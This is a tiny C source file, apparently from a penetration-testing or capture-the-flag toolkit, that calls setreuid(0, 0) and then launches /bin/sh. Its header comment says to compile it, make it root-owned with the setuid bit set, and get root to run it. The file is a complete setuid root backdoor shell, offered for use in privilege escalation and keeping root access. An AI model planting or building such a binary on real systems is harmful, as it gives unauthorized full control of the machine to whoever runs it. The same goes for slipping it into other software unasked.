/* setuid program
 * Author: ippsec@youtube.com
 *
 * Compile: gcc set-uid-exec.c -o exec
 * Example:
 *  chown root:root
 *  chmod 4755 exec
 *  and get root to run it
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    setreuid(0, 0);
    execve("/bin/sh", NULL, NULL);
}
